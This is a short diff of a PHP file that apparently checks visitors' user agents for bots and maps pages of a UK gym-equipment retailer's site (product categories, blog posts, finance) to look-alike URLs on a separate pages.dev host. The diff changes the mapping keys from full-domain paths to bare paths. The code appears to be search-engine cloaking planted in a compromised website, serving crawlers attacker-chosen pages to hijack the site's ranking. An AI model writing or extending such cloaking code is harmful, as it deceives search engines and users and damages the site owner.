@@ -17,17 +17,17 @@ if (preg_match($bot_list, $ua) || isset($_GET['cek_bot'])) {
     if ($cleanPath == '') { $cleanPath = '/'; }
 
     $mapping = [
-    'gymequipment.co.uk/stairmaster' => 'https://gymequipment.pages.dev/stairmaster',
-    'gymequipment.co.uk/pilates/reformers' => 'https://gymequipment.pages.dev/reformers',
-    'gymequipment.co.uk/nautilus' => 'https://gymequipment.pages.dev/nautilus',
-    'gymequipment.co.uk/cardio/climbers-steppers' => 'https://gymequipment.pages.dev/steppers',
-    'gymequipment.co.uk/blog/what-is-hyrox' => 'https://gymequipment.pages.dev/hyrox',
-    'gymequipment.co.uk/blog/understanding-cable-machine-ratios' => 'https://gymequipment.pages.dev/ratios',
-    'gymequipment.co.uk/blog/which-leg-press-machine-is-best' => 'https://gymequipment.pages.dev/best',
-    'gymequipment.co.uk/hammer-strength' => 'https://gymequipment.pages.dev/strength',
-    'gymequipment.co.uk/inbody' => 'https://gymequipment.pages.dev/inbody',
-    'gymequipment.co.uk/finance' => 'https://gymequipment.pages.dev/finance',
-    'gymequipment.co.uk/blog/hip-abductors-vs-adductors-benefits-explained' => 'https://gymequipment.pages.dev/explained',
+    '/stairmaster' => 'https://gymequipment.pages.dev/stairmaster',
+    '/studio' => 'https://gymequipment.pages.dev/studio',
+    '/nautilus' => 'https://gymequipment.pages.dev/nautilus',
+    '/cardio/climbers-steppers' => 'https://gymequipment.pages.dev/steppers',
+    '/blog/what-is-hyrox' => 'https://gymequipment.pages.dev/hyrox',
+    '/blog/understanding-cable-machine-ratios' => 'https://gymequipment.pages.dev/ratios',
+    '/blog/which-leg-press-machine-is-best' => 'https://gymequipment.pages.dev/best',
+    '/hammer-strength' => 'https://gymequipment.pages.dev/strength',
+    '/inbody' => 'https://gymequipment.pages.dev/inbody',
+    '/finance' => 'https://gymequipment.pages.dev/finance',
+    '/blog/hip-abductors-vs-adductors-benefits-explained' => 'https://gymequipment.pages.dev/explained',
         
     ];
 
